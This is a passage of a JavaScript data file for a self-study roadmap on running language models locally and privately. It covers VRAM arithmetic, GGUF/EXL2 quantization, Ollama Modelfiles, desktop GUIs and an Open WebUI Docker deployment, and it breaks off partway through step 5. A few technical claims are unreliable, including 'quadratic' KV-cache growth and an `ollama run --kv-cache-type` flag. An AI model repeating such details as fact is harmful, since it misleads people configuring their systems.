// Complete production-grade steps data for "Local LLMs & Privacy" Roadmap (15 Nodes)

export const localLlmsPrivacyData = {
  id: "local-llms-privacy",
  title: "Local LLMs & Privacy",
  description: "Ollama, llama.cpp, quantized model selection, vLLM serving, and air-gapped confidential RAG.",
  category: "Role & Workflow Roadmaps",
  stepCount: 15,
  phases: [
    {
      id: "phase-1",
      title: "Phase 1: Hardware Sizing, Quantization & Local Runtimes",
      description: "Master VRAM mathematics, unified memory architectures, GGUF/EXL2 quantization trade-offs, and CLI/GUI runtime configurations."
    },
    {
      id: "phase-2",
      title: "Phase 2: Private Workspaces, Offline Coding & Local RAG",
      description: "Deploy self-hosted Open WebUI instances, air-gapped code autocomplete in VS Code, local vector embeddings, and private STT/TTS."
    },
    {
      id: "phase-3",
      title: "Phase 3: Open-Weight Model Selection, Fine-Tuning & Local Agents",
      description: "Benchmark DeepSeek-R1 and Qwen, curate ShareGPT datasets, train consumer QLoRA adapters with Unsloth, and run local MCP agents."
    },
    {
      id: "phase-4",
      title: "Phase 4: Enterprise Privacy, PII Redaction & Production Serving",
      description: "Strip PII with Microsoft Presidio, scale multi-user throughput with vLLM PagedAttention, and enforce zero-telemetry network isolation."
    }
  ],
  steps: [
    // Node 1
    {
      id: "step-1",
      stepNumber: 1,
      phaseId: "phase-1",
      title: "Hardware Sizing, VRAM Math & Unified Memory Architecture",
      timeEstimate: "45 mins",
      difficulty: "Beginner",
      summary: "Calculate exact memory bandwidth and VRAM requirements for 7B, 14B, 32B, and 70B parameter models across NVIDIA GPUs and Apple Silicon Macs.",
      description: "The primary bottleneck in running large language models locally is not compute (TFLOPS), but memory capacity (VRAM) and memory bandwidth (GB/s). Every token generated requires streaming all billions of model weights through memory. If a model exceeds available VRAM and spills into system RAM or PCIe bus transfers, generation speeds collapse from 45 tokens/sec to under 2 tokens/sec. Mastering the exact arithmetic of parameter sizing, precision bits, and KV-cache overhead guarantees zero OOM (Out-of-Memory) crashes.",
      playbook: {
        setup: "Inspect your system hardware: On Apple Silicon, verify unified memory via System Information (e.g. 36GB, 64GB, 128GB). On Linux/Windows, run `nvidia-smi` to verify dedicated VRAM and driver CUDA version.",
        execute: "Apply the VRAM sizing formula: Total VRAM = (Parameters in Billions × Bits per Weight / 8) × 1.20 (KV cache & context overhead). For a 14B model at 4-bit quantization: (14 × 4 / 8) × 1.20 = 8.4 GB VRAM required for an 8k context window.",
        verify: "Run `ollama run qwen2.5:14b` and monitor memory consumption using `nvtop` (on Linux) or `sudo powermetrics --samplers gpu_power` / Activity Monitor on macOS. Verify zero swapping to disk."
      },
      tools: [
        {
          name: "Hugging Face VRAM Calculator",
          type: "Free",
          url: "https://huggingface.co/spaces/NyxAI/LLM-Memory-Calculator",
          description: "Visual memory calculator estimating exact model weight footprint, activation memory, and KV-cache requirements across various context lengths.",
          bestFor: "Accurate VRAM & context length capacity estimation"
        },
        {
          name: "Ollama",
          type: "Free",
          url: "https://ollama.com",
          description: "Zero-dependency local model runtime that automatically detects available GPU VRAM and offloads optimal layer splits to Apple Silicon or CUDA.",
          bestFor: "Automated layer offloading & memory detection"
        },
        {
          name: "Apple MLX",
          type: "Free",
          url: "https://github.com/ml-explore/mlx",
          description: "Apple silicon machine learning framework designed for unified memory architectures, enabling native 4-bit model inference up to 128GB.",
          bestFor: "Native Mac unified memory acceleration & MLX models"
        }
      ],
      callouts: {
        mistake: "Assuming a 70B parameter model will run on a 16GB GPU because 'it has 64GB of system RAM'—spilling to DDR RAM causes unusable 0.8 tokens/sec.",
        proTip: "Apple Silicon unified memory treats RAM as pooled GPU memory; a 128GB M3 Max Mac can comfortably run a 70B Q8 model that would otherwise require $8,000+ in NVIDIA enterprise cards.",
        mistakes: [
          "Assuming a 70B parameter model will run on a 16GB GPU because 'it has 64GB of system RAM'—spilling to DDR RAM causes unusable 0.8 tokens/sec.",
          "Forgetting to calculate the KV-cache memory overhead when expanding context windows from 2k tokens to 32k or 128k tokens.",
          "Purchasing multiple consumer GPUs without verifying PCIe lane speeds (x16 vs x4) and motherboard bandwidth splits."
        ],
        proTips: [
          "Apple Silicon unified memory treats RAM as pooled GPU memory; a 128GB M3 Max Mac can comfortably run a 70B Q8 model that would otherwise require $8,000+ in NVIDIA enterprise cards.",
          "Enable FlashAttention-2 or Ollama's native context quantization (`ollama run --kv-cache-type q4_0`) to cut KV cache memory consumption by 50%.",
          "On Apple Silicon, increase macOS default GPU allocation ceiling beyond 75% using `sudo sysctl iogpu.wired_mem_limit=...` to unlock maximum VRAM headroom."
        ]
      },
      promptLab: {
        recommendedModel: "Claude 3.7 Sonnet / Ollama Llama-3.3-70B",
        variables: [
          {
            id: "hardwareRig",
            label: "Host Hardware Rig",
            options: [
              "Apple Silicon M3/M4 Max (64GB to 128GB Unified Memory)",
              "NVIDIA Single Consumer GPU (RTX 4090 24GB VRAM)",
              "Dual NVIDIA GPUs (2x RTX 3090 48GB VRAM pooled via PCIe)",
              "Budget Workstation (16GB System RAM + CPU only)"
            ],
            defaultOption: "NVIDIA Single Consumer GPU (RTX 4090 24GB VRAM)"
          },
          {
            id: "targetModelFamily",
            label: "Target Model Scale",
            options: [
              "8B Parameter Class (Llama 3.1 8B, Qwen 2.5 7B)",
              "14B - 32B Class (Qwen 2.5 14B/32B, DeepSeek-R1-Distill-14B/32B)",
              "70B Frontier Class (Llama 3.3 70B, Qwen 2.5 72B)",
              "Mixture-of-Experts MoE (Mixtral 8x7B, DeepSeek 67B MoE)"
            ],
            defaultOption: "14B - 32B Class (Qwen 2.5 14B/32B, DeepSeek-R1-Distill-14B/32B)"
          },
          {
            id: "contextTarget",
            label: "Context Window Requirement",
            options: [
              "Standard Dialogue (4,096 tokens)",
              "Document Analysis (16,384 tokens)",
              "Full Codebase & Book Ingestion (64,000 to 128,000 tokens)"
            ],
            defaultOption: "Document Analysis (16,384 tokens)"
          }
        ],
        template: "Act as a Senior AI Systems Infrastructure Engineer and Local Hardware Architect. I am planning a self-hosted local model deployment on [hardwareRig] running a [targetModelFamily] with [contextTarget].\n\nCalculate and provide a comprehensive hardware sizing matrix:\n1. Theoretical VRAM Breakdown: Calculate raw model weight footprint across FP16, Q8_0, Q5_K_M, and Q4_K_M quantization levels.\n2. KV Cache Arithmetic: Calculate exact context memory consumption for [contextTarget] using 16-bit vs 4-bit KV cache quantization.\n3. Estimated Inference Speed: Estimate expected tokens/sec generation throughput based on memory bandwidth constraints (e.g. 1,008 GB/s on RTX 4090 vs 400 GB/s on M3 Max).\n4. Recommended Model Tier: Provide the exact model slug and quantization sweet spot that fits 100% inside VRAM with zero offloading penalties.",
        expectedOutputs: [
          "Exact memory table comparing FP16, Q8_0, Q5_K_M, and Q4_K_M footprints",
          "Mathematical KV-cache memory calculation for target context window",
          "Expected tokens/sec throughput based on memory bandwidth limits",
          "Final hardware-tailored model recommendation with zero-OOM guarantee"
        ]
      },
      learning: {
        resources: [
          {
            title: "Hugging Face: Hardware Selection & LLM Memory Calculation Guide",
            badge: "OFFICIAL DOCS",
            url: "https://huggingface.co/docs/transformers/main/en/perf_infer_gpu_one"
          },
          {
            title: "llama.cpp: Memory Bandwidth & Benchmarking Documentation",
            badge: "GITHUB",
            url: "https://github.com/ggerganov/llama.cpp"
          }
        ]
      },
      conceptGuide: {
        title: "The Physics of Memory Bandwidth and Inference Latency",
        overview: "In typical machine learning training workloads, raw compute (matrix multiplication FLOPS) dominates. In contrast, autoregressive LLM inference during the token generation phase is strictly memory-bandwidth bound. To predict the next single token, every weight in the neural network must be fetched from memory into the GPU compute cores. If your GPU memory bandwidth is 1,000 GB/s and your model file is 20 GB in size, the theoretical speed limit is 1,000 / 20 = 50 tokens per second. Understanding this fundamental physical relationship explains why quantization and fast memory buses are the true keys to local AI performance.",
        keyPoints: [
          {
            lead: "The Memory-Bandwidth Bottleneck",
            text: "Token generation requires streaming all billions of parameters per token; throughput equals memory bandwidth divided by model weight size."
          },
          {
            lead: "Unified Memory vs. Discrete VRAM",
            text: "NVIDIA GDDR6X offers blazing 1,000+ GB/s speed in small 24GB pools; Apple Silicon offers massive pooled capacity (up to 128GB+) at 300-800 GB/s."
          },
          {
            lead: "The KV-Cache Tax",
            text: "Long context windows allocate quadratic key-value caches; a 64k context can easily consume an additional 8GB to 14GB of VRAM beyond model weights."
          }
        ]
      }
    },

    // Node 2
    {
      id: "step-2",
      stepNumber: 2,
      phaseId: "phase-1",
      title: "Model Weights & Quantization Formats (GGUF, EXL2, AWQ)",
      timeEstimate: "50 mins",
      difficulty: "Intermediate",
      summary: "Understand floating-point precision vs. 4-bit/8-bit quantization (Q4_K_M, Q5_K_M, Q8_0) to preserve reasoning quality while cutting memory usage by 65%.",
      description: "Original model weights are released in 16-bit floating point precision (FP16 or BF16), requiring 2 bytes per parameter (a 70B model requires 140 GB of VRAM). Quantization compresses these weights into lower bit-depth representations (4-bit, 5-bit, 6-bit, or 8-bit). With modern k-quants and importance matrices (imatrix), a 4-bit quantized model (e.g., Q4_K_M) retains over 99% of the original model's reasoning perplexity while reducing memory footprint by over 65%, making massive models accessible on consumer workstations.",
      playbook: {
        setup: "Install llama.cpp or inspect GGUF model repositories on Hugging Face (e.g. from creators like TheBloke, bartowski, or unsloth).",
        execute: "Select the optimal quantization variant based on your hardware profile: Use `Q4_K_M` (medium k-quant) for the ideal balance between memory savings and perplexity; use `Q5_K_M` for nuanced creative writing or coding; use `Q8_0` only when mathematical precision is critical and VRAM is abundant.",
        verify: "Evaluate the model's perplexity using llama-bench (`llama-bench -m model.gguf -p 512 -n 128`). Verify that generation speed and benchmark accuracy align with target requirements."
      },
      tools: [
        {
          name: "llama.cpp",
          type: "Free",
          url: "https://github.com/ggerganov/llama.cpp",
          description: "The gold standard C/C++ inference runtime that invented the GGUF binary format, featuring CPU/GPU cross-platform compilation.",
          bestFor: "GGUF format quantization & cross-platform execution"
        },
        {
          name: "Hugging Face",
          type: "Freemium",
          url: "https://huggingface.co",
          description: "Global open-source AI registry hosting hundreds of thousands of pre-quantized GGUF, AWQ, and EXL2 model weights.",
          bestFor: "Model weight discovery & community imatrix benchmarks"
        },
        {
          name: "Unsloth Dynamic Quants",
          type: "Free",
          url: "https://unsloth.ai",
          description: "Advanced quantization pipeline creating calibrated dynamic 4-bit GGUF models with minimal perplexity degradation.",
          bestFor: "High-precision calibrated GGUF quantization"
        }
      ],
      callouts: {
        mistake: "Downloading generic `Q4_0` (legacy 4-bit) instead of `Q4_K_M` (modern k-quant with importance matrix), sacrificing noticeable reasoning accuracy for zero memory benefit.",
        proTip: "On dedicated NVIDIA GPUs running Linux, EXL2 (ExLlamaV2) and AWQ formats deliver up to 2x faster token generation speeds than GGUF due to custom CUDA kernels.",
        mistakes: [
          "Downloading generic `Q4_0` (legacy 4-bit) instead of `Q4_K_M` (modern k-quant with importance matrix), sacrificing noticeable reasoning accuracy for zero memory benefit.",
          "Selecting `Q2_K` (2-bit quantization) on complex models, causing severe cognitive collapse, repetitive token loops, and hallucinated syntax.",
          "Assuming all 4-bit models are identical: GGUF runs on CPU+GPU, while EXL2 and AWQ require dedicated NVIDIA CUDA hardware."
        ],
        proTips: [
          "On dedicated NVIDIA GPUs running Linux, EXL2 (ExLlamaV2) and AWQ formats deliver up to 2x faster token generation speeds than GGUF due to custom CUDA kernels.",
          "Always prioritize a larger quantized model over a smaller unquantized model: a 70B model at Q4_K_M vastly outperforms an 8B model at full FP16.",
          "Look for 'imatrix' (importance matrix) quantized GGUFs: they calibrate critical neural layers at higher precision, boosting reasoning scores on 4-bit quants."
        ]
      },
      promptLab: {
        recommendedModel: "Claude 3.7 Sonnet / llama.cpp CLI",
        variables: [
          {
            id: "modelTarget",
            label: "Base Model Architecture",
            options: [
              "Qwen 2.5 Coder 32B Instruct",
              "DeepSeek-R1-Distill-Llama-70B",
              "Llama 3.1 8B Instruct",
              "Mistral Small 24B Instruct"
            ],
            defaultOption: "Qwen 2.5 Coder 32B Instruct"
          },
          {
            id: "quantFormat",
            label: "Quantization Target",
            options: [
              "GGUF Q4_K_M (Universal CPU/Mac/GPU)",
              "GGUF Q5_K_M (Enhanced precision sweet spot)",
              "EXL2 4.25 bpw (High-speed NVIDIA Linux)",
              "AWQ 4-bit (vLLM production server)"
            ],
            defaultOption: "GGUF Q4_K_M (Universal CPU/Mac/GPU)"
          },
          {
            id: "inferenceHardware",
            label: "Target Compute Platform",
            options: [
              "Apple Silicon Unified Memory (macOS)",
              "NVIDIA RTX 40-Series (Windows/Linux CUDA)",
              "Cloud VPS (Ubuntu CPU-only with AVX-512)"
            ],
            defaultOption: "Apple Silicon Unified Memory (macOS)"
          }
        ],
        template: "Act as an Open-Weight AI Kernel Engineer and Quantization Specialist. I want to deploy [modelTarget] using [quantFormat] on [inferenceHardware].\n\nProvide a technical quantization specification:\n1. Precision vs. Perplexity Analysis: Compare the expected MMLU and HumanEval score retention between full FP16, Q8_0, and [quantFormat].\n2. Download & Execution Command: Provide the exact huggingface-cli or llama.cpp terminal command to pull the verified imatrix GGUF file.\n3. Layer Offloading Flags: Provide the optimized launch parameters (e.g., `-ngl 99`, `-c 16384`, `-fa 1`, `--numa`) calibrated for [inferenceHardware].\n4. Sanity Check Checklist: How to verify using token output logs that all layers loaded into GPU memory without fallback to CPU.",
        expectedOutputs: [
          "Mathematical precision retention table comparing FP16 vs selected quant",
          "Exact terminal CLI commands to download and inspect model shards",
          "Optimized hardware launch flags for zero-bottleneck execution",
          "VRAM layer verification terminal commands"
        ]
      },
      learning: {
        resources: [
          {
            title: "llama.cpp: GGUF Specification & Quantization Levels",
            badge: "OFFICIAL DOCS",
            url: "https://github.com/ggerganov/llama.cpp/blob/master/examples/quantize/README.md"
          },
          {
            title: "Hugging Face: Overview of Quantization Formats",
            badge: "GUIDE",
            url: "https://huggingface.co/docs/transformers/main/en/quantization/overview"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Weight Quantization and K-Quants",
        overview: "In neural network weights, values are distributed along a Gaussian curve centered near zero. Traditional quantization linearly maps these 16-bit float values to integer bins, causing significant precision clipping in outlier activation channels. Modern techniques—specifically GGUF k-quants (Block-wise Quantization) and importance matrix calibration (imatrix)—divide weight tensors into independent blocks and allocate higher bit depths to sensitive attention layers while aggressively compressing non-critical feed-forward weights. This asymmetrical compression preserves reasoning while slashing memory requirements.",
        keyPoints: [
          {
            lead: "The 4-Bit Sweet Spot (Q4_K_M)",
            text: "Q4_K_M reduces weight size by ~68% with less than a 0.05 increase in perplexity, making it the universal default choice."
          },
          {
            lead: "Importance Matrices (imatrix)",
            text: "Calibrating weights against a diverse training text corpus ensures critical reasoning pathways retain maximum floating-point precision."
          },
          {
            lead: "Format Selection Criteria",
            text: "Use GGUF for universal portability and Apple Silicon; use AWQ/EXL2 for dedicated multi-GPU Linux clusters requiring maximum batched speed."
          }
        ]
      }
    },

    // Node 3
    {
      id: "step-3",
      stepNumber: 3,
      phaseId: "phase-1",
      title: "Zero-Config Local CLI & REST API Server with Ollama",
      timeEstimate: "35 mins",
      difficulty: "Beginner",
      summary: "Pull open-weight models via terminal, customize Modelfiles (temperature, num_ctx, system prompts), and expose a local port 11434 OpenAI-compatible API.",
      description: "Ollama has become the standard utility for running open-weight language models locally. It abstracts the complexity of compiling C++ runtimes, downloading split model weights, configuring GPU drivers, and setting up reverse proxies into single terminal commands (`ollama run llama3.1`). Furthermore, Ollama automatically serves an OpenAI-compatible HTTP API on `localhost:11434`, enabling any application, script, or extension built for ChatGPT to point to your local machine with zero code refactoring.",
      playbook: {
        setup: "Install Ollama via `curl -fsSL https://ollama.com/install.sh` on macOS/Linux or the Windows installer. Verify the daemon is active with `ollama --version`.",
        execute: "Pull and run an efficient coding model: `ollama run qwen2.5-coder:14b`. Create a custom `Modelfile` configuring `PARAMETER num_ctx 16384` (expanding context) and `SYSTEM \"You are an air-gapped secure senior engineer.\"` and build it with `ollama create my-assistant -f Modelfile`.",
        verify: "Test the local REST API with curl: Send an OpenAI-formatted JSON payload to `http://localhost:11434/v1/chat/completions`. Confirm an instant streaming response over localhost."
      },
      tools: [
        {
          name: "Ollama",
          type: "Free",
          url: "https://ollama.com",
          description: "Cross-platform CLI and daemon for orchestrating, pulling, running, and managing local LLM models with built-in REST API.",
          bestFor: "Zero-config local model management & OpenAI API emulation"
        },
        {
          name: "llama.cpp",
          type: "Free",
          url: "https://github.com/ggerganov/llama.cpp",
          description: "The underlying high-performance engine powering Ollama, accessible directly for advanced low-level parameter tuning.",
          bestFor: "Low-level parameter tuning & advanced inference flags"
        },
        {
          name: "Raycast Ollama",
          type: "Free",
          url: "https://www.raycast.com",
          description: "Keyboard-driven macOS launcher extension connecting native keyboard shortcuts directly to your local Ollama instance.",
          bestFor: "Instant system-wide keyboard shortcut queries"
        }
      ],
      callouts: {
        mistake: "Assuming Ollama defaults to the model's full context window: Ollama defaults to 2,048 tokens (`num_ctx 2048`) unless explicitly overridden in a Modelfile or API payload.",
        proTip: "Set `OLLAMA_KEEP_ALIVE=-1` in your environment variables to keep models permanently loaded into VRAM, eliminating the 4-second model loading delay between queries.",
        mistakes: [
          "Assuming Ollama defaults to the model's full context window: Ollama defaults to 2,048 tokens (`num_ctx 2048`) unless explicitly overridden in a Modelfile or API payload.",
          "Exposing `0.0.0.0:11434` to the public internet without authentication, allowing remote attackers to run unauthenticated prompts on your hardware.",
          "Running multiple heavy models simultaneously without checking VRAM limits, triggering aggressive swapping or process termination."
        ],
        proTips: [
          "Set `OLLAMA_KEEP_ALIVE=-1` in your environment variables to keep models permanently loaded into VRAM, eliminating the 4-second model loading delay between queries.",
          "Inspect running model memory allocations and offloaded layer splits in real time using `ollama ps`.",
          "Use `OLLAMA_FLASH_ATTENTION=1` in your system environment to activate fast FlashAttention kernels and slash VRAM consumption."
        ]
      },
      promptLab: {
        recommendedModel: "Ollama Qwen-2.5-Coder / Llama-3.1",
        variables: [
          {
            id: "modelBase",
            label: "Base Model Slug",
            options: [
              "qwen2.5-coder:14b",
              "deepseek-r1:14b",
              "llama3.3:70b",
              "mistral-nemo:12b"
            ],
            defaultOption: "qwen2.5-coder:14b"
          },
          {
            id: "contextLength",
            label: "Context Window (num_ctx)",
            options: [
              "8192 (8k tokens - Low VRAM)",
              "16384 (16k tokens - Balanced)",
              "32768 (32k tokens - Large Codebases)",
              "65536 (64k tokens - Extended Docs)"
            ],
            defaultOption: "16384 (16k tokens - Balanced)"
          },
          {
            id: "agentRole",
            label: "Custom Agent Persona",
            options: [
              "Air-Gapped Cybersecurity & Code Auditor",
              "Concise Senior Full-Stack TypeScript Architect",
              "Offline Legal & Confidential Contract Analyst"
            ],
            defaultOption: "Concise Senior Full-Stack TypeScript Architect"
          }
        ],
        template: "# Complete Production Ollama Modelfile Configuration\n\nFROM [modelBase]\n\n# Configure Memory & Sampling Parameters\nPARAMETER num_ctx [contextLength]\nPARAMETER temperature 0.2\nPARAMETER top_p 0.9\nPARAMETER repeat_penalty 1.1\nPARAMETER stop \"<|im_end|>\"\nPARAMETER stop \"<|endoftext|>\"\n\n# System Prompt Constraint\nSYSTEM \"\"\"\nYou are an expert [agentRole]. You operate strictly in an air-gapped, zero-telemetry offline environment.\n- Provide direct, concise, production-ready code with strict typing.\n- Never explain obvious boilerplate unless explicitly requested.\n- Point out security vulnerabilities, performance bottlenecks, and edge cases.\n\"\"\"",
        expectedOutputs: [
          "Complete, copy-pasteable Ollama Modelfile ready for `ollama create`",
          "Exact terminal build command and environment variable launch flags",
          "cURL verification payload testing local port 11434 OpenAI-compatible endpoint"
        ]
      },
      learning: {
        resources: [
          {
            title: "Ollama: Official Modelfile Specification & Parameter Reference",
            badge: "OFFICIAL DOCS",
            url: "https://github.com/ollama/ollama/blob/main/docs/modelfile.md"
          },
          {
            title: "Ollama: OpenAI Compatibility REST API Endpoints",
            badge: "OFFICIAL DOCS",
            url: "https://github.com/ollama/ollama/blob/main/docs/openai.md"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Ollama and Local Model Daemons",
        overview: "Before Ollama, running a local model required cloning git repositories, installing CMake, compiling C++ binaries for your specific CPU architecture, downloading multi-part raw weights from Hugging Face, and manually managing GPU layer offloading flags. Ollama unifies this pipeline into a standardized Docker-like architecture: models are distributed as containerized 'Manifests' containing weights, system prompts, template formats, and tokenizers. An underlying system daemon manages memory persistence, request routing, and layer offloading automatically.",
        keyPoints: [
          {
            lead: "The OpenAI Compatibility Layer",
            text: "Ollama natively emulates the `/v1/chat/completions` API schema, making it an instant drop-in replacement for OpenAI SDKs."
          },
          {
            lead: "The Modelfile Abstraction",
            text: "Similar to a Dockerfile, an Ollama Modelfile packages system prompts, temperature thresholds, and context lengths into a versioned image."
          },
          {
            lead: "VRAM Memory Management",
            text: "Ollama automatically unloads idle models after a configurable timeout (default 5 minutes) to free GPU memory for desktop applications."
          }
        ]
      }
    },

    // Node 4
    {
      id: "step-4",
      stepNumber: 4,
      phaseId: "phase-1",
      title: "Desktop GUI Model Benchmarking & Parameter Tuning",
      timeEstimate: "40 mins",
      difficulty: "Beginner",
      summary: "Visually compare model speeds (tokens/sec), offloading GPU layers, inspecting context overflow, and running side-by-side local model evaluations.",
      description: "While the terminal is ideal for automation, desktop GUI applications provide visual telemetry essential for diagnosing hardware bottlenecks. Dedicated local model interfaces allow you to visually slide GPU layer offload sliders, monitor real-time token generation metrics (Time-to-First-Token and tokens per second), test sampling parameters (temperature, Top-P, Min-P), and execute side-by-side model comparisons across different quantizations.",
      playbook: {
        setup: "Install LM Studio (macOS/Windows/Linux) or Jan.ai. Open the discovery tab and search for popular open models like `qwen2.5-7b` or `deepseek-r1-distill-qwen-14b`.",
        execute: "Load a model into the Playground. Adjust the GPU offload slider to maximize GPU layer distribution while leaving 2GB of VRAM headroom for the operating system display server.",
        verify: "Run a standardized prompt (e.g., 'Write a Python implementation of Dijkstra's algorithm'). Record TTFT (Time-to-First-Token) and generation speed (tokens/sec). Confirm generation exceeds 25 tokens/sec for comfortable conversational interaction."
      },
      tools: [
        {
          name: "LM Studio",
          type: "Free",
          url: "https://lmstudio.ai",
          description: "Feature-packed desktop GUI for discovering, downloading, and running GGUF models with visual GPU acceleration sliders and built-in local server.",
          bestFor: "Visual GPU layer management & Hugging Face model search"
        },
        {
          name: "Jan.ai",
          type: "Free",
          url: "https://jan.ai",
          description: "Open-source, privacy-first desktop alternative to ChatGPT running 100% offline with clean multi-chat organization.",
          bestFor: "Clean open-source desktop interface & local chat storage"
        },
        {
          name: "Msty",
          type: "Freemium",
          url: "https://msty.app",
          description: "Power-user desktop application featuring side-by-side split-view comparison prompts, local RAG knowledge stacks, and branch chatting.",
          bestFor: "Side-by-side model comparison & multi-model evaluation"
        }
      ],
      callouts: {
        mistake: "Maxing out the GPU layer slider to 100% on a machine running dual 4K monitors, crashing the desktop window compositor due to video VRAM starvation.",
        proTip: "Use 'Min-P' sampling (e.g. `min_p = 0.05`) instead of traditional Top-P: it dynamically scales probability thresholds based on model confidence, dramatically improving reasoning consistency.",
        mistakes: [
          "Maxing out the GPU layer slider to 100% on a machine running dual 4K monitors, crashing the desktop window compositor due to video VRAM starvation.",
          "Comparing two models without matching temperature and context lengths, producing invalid benchmark conclusions.",
          "Downloading multiple massive models to an external slow HDD, bottlenecking model startup times to several minutes."
        ],
        proTips: [
          "Use 'Min-P' sampling (e.g. `min_p = 0.05`) instead of traditional Top-P: it dynamically scales probability thresholds based on model confidence, dramatically improving reasoning consistency.",
          "LM Studio includes a local developer server toggle: you can inspect incoming API requests in an interactive visual log stream.",
          "Keep model files on an NVMe SSD with >= 3,500 MB/s read speed to load 15GB models into VRAM in under 4 seconds."
        ]
      },
      promptLab: {
        recommendedModel: "LM Studio / Jan.ai with Qwen-2.5-14B",
        variables: [
          {
            id: "benchmarkTask",
            label: "Evaluation Benchmark Task",
            options: [
              "Complex Code Generation (Self-balancing AVL tree in Rust)",
              "Multi-Step Mathematical Reasoning (Word problems with fractions)",
              "Strict JSON Extraction (Parsing unstructured medical clinical notes)",
              "Long-Context Needle-in-a-Haystack (Extracting key fact from 15k context)"
            ],
            defaultOption: "Complex Code Generation (Self-balancing AVL tree in Rust)"
          },
          {
            id: "samplingProfile",
            label: "Sampling Parameter Profile",
            options: [
              "Deterministic Reasoning (temp: 0.0, top_p: 1.0, min_p: 0.0)",
              "Balanced Production (temp: 0.4, min_p: 0.05, repeat_penalty: 1.1)",
              "Creative Drafting (temp: 0.8, top_p: 0.95, min_p: 0.02)"
            ],
            defaultOption: "Deterministic Reasoning (temp: 0.0, top_p: 1.0, min_p: 0.0)"
          },
          {
            id: "guiTool",
            label: "Desktop Interface",
            options: [
              "LM Studio Desktop",
              "Jan.ai Open-Source",
              "Msty Multi-Model Canvas"
            ],
            defaultOption: "LM Studio Desktop"
          }
        ],
        template: "# Standardized Local Model Benchmark Prompt\n\nTask: [benchmarkTask]\nConfiguration: Running via [guiTool] with [samplingProfile]\n\nExecute the following evaluation suite:\n1. Generate a complete, compilation-ready implementation solving: [benchmarkTask].\n2. Include comprehensive unit tests verifying 3 edge cases (empty input, max boundary, malformed data).\n3. State the algorithmic time and space complexity in Big-O notation.\n\nEvaluation Metrics to Record in [guiTool]:\n- Time-to-First-Token (TTFT) in milliseconds\n- Sustained Generation Speed in tokens/second\n- Peak VRAM Consumption (GB)\n- Output Accuracy & Syntax Validation (Pass/Fail)",
        expectedOutputs: [
          "Standardized prompt template for cross-model regression testing",
          "Telemetry checklist for recording TTFT, tokens/sec, and peak VRAM",
          "Side-by-side score card comparing accuracy across different quantization levels"
        ]
      },
      learning: {
        resources: [
          {
            title: "LM Studio Documentation: Hardware Acceleration & Local Server",
            badge: "OFFICIAL DOCS",
            url: "https://lmstudio.ai/docs"
          },
          {
            title: "Jan.ai: Open Source Local AI Architecture Guide",
            badge: "GITHUB",
            url: "https://jan.ai/docs"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of GPU Layer Offloading and Sampling",
        overview: "When running a model on consumer GPUs with limited VRAM, llama.cpp and desktop GUIs employ partial layer offloading (`-ngl` or 'n-gpu-layers'). If a model has 32 transformer layers and your GPU only has enough memory for 24, the runtime splits the model: layers 1–24 execute at lightning speed on the GPU, while layers 25–32 execute on the CPU. While hybrid execution allows running models that would otherwise exceed memory, data must traverse the PCIe bus twice per layer, creating latency. Desktop GUIs provide the visual feedback necessary to find the optimal layer split.",
        keyPoints: [
          {
            lead: "The PCIe Bus Penalty",
            text: "Even a single layer left on the CPU forces GPU-to-RAM memory synchronization, cutting overall generation speed by up to 60%."
          },
          {
            lead: "Min-P vs. Top-P Sampling",
            text: "Min-P filters out candidate tokens whose probability is less than P% of the top candidate's probability, outperforming static Top-P."
          },
          {
            lead: "VRAM Headroom Buffer",
            text: "Always reserve 1.5GB to 2GB of VRAM for the desktop operating system to prevent desktop stuttering and black-screen crashes."
          }
        ]
      }
    },

    // Node 5
    {
      id: "step-5",
      stepNumber: 5,
      phaseId: "phase-2",
      title: "Self-Hosted ChatGPT-Style Workspace with Open WebUI",
      timeEstimate: "50 mins",
      difficulty: "Intermediate",
      summary: "Deploy a feature-rich, multi-user offline interface with voice input, web search toggles, artifact rendering, and secure Tailscale remote access.",
      description: "While desktop apps are convenient for solo use, teams and household homelabs require a centralized web portal with user accounts, persistent chat history, document attachments, and web access. Open WebUI is the leading self-hosted ChatGPT interface. It connects to local Ollama or vLLM backends, supports real-time streaming, integrates local whisper voice input, and when paired with Tailscale, provides zero-exposure, encrypted remote access from your smartphone or laptop from anywhere in the world.",
      playbook: {
        setup: "Ensure Docker and Docker Compose are installed on your host machine. Verify Ollama is running and accessible.",
        execute: "Run Open WebUI via Docker with GPU support: `docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main`.",
        verify: "Navigate to `http://localhost:3000`. Create the admin account, verify your local Ollama models appear in the model dropdown, and test sending a prompt."
      },
      tools: [
        {
          name: "Open WebUI",
          type: "Free",
          url: "https://openwebui.com",
          description: "Full-featured, open-source ChatGPT replacement with multi-model chat, user management, RAG pipeline, and custom agent tools.",
          bestFor: "Self-hosted team chat interface & mobile web access"
        },
        {
          name: "Docker",
          type: "Free",
          url: "https://www.docker.com",
          description: "Containerization platform ensuring repeatable, isolated deployment of Open WebUI, vector databases, and reverse proxies.",
          bestFor: "Isolated reproducible application deployment"
        },
        {
          name: "Tailscale",
          type: "Freemium",
          url: "https://tailscale.com",
          description: "Zero-config WireGuard mesh VPN that provides secure, encrypted remote access to your local Open WebUI without opening firewall ports.",
          bestFor: "Encrypted remote access from mobile devices with zero port forwarding"
        }
      ],
      callouts: {
        mistake: "Port forwarding port 3000 on your home router to access your local models remotely, exposing your private server to automated web crawlers and credential stuffing.",
        proTip: "Use Tailscale MagicDNS to access your local server at `http://homelab:3000` from your phone anywhere in the world with zero port forwarding or public IP exposure.",
        mistakes: [
          "Port forwarding port 3000 on your home router to access your local models remotely, exposing your private server to automated web crawlers and credential stuffing.",
          "Failing to mount a persistent Docker volume (`-v open-webui:/app/backend/data`), causing all chat histories and accounts to vanish upon container restart.",
          "Running Open WebUI on the same network subnet without configuring authentication, allowing any local Wi-Fi user full admin access."
        ],
        proTips: [
          "Use Tailscale MagicDNS to access your local server at `http://homelab:3000` from your phone anywhere in the world with zero port forwarding or public IP exposure.",
          "Enable Open WebUI's built-in SearXNG integration to give your local models real-time, privacy-preserving web search capabilities.",
          "Configure 'Pipelines' inside Open WebUI to add custom Python pre-processing, rate-limiting, and PII filters before prompts reach Ollama."
        ]
      },
      promptLab: {
        recommendedModel: "Open WebUI with Llama-3.3-70B / Qwen-2.5-32B",
        variables: [
          {
            id: "deploymentEnv",
            label: "Hosting Infrastructure",
            options: [
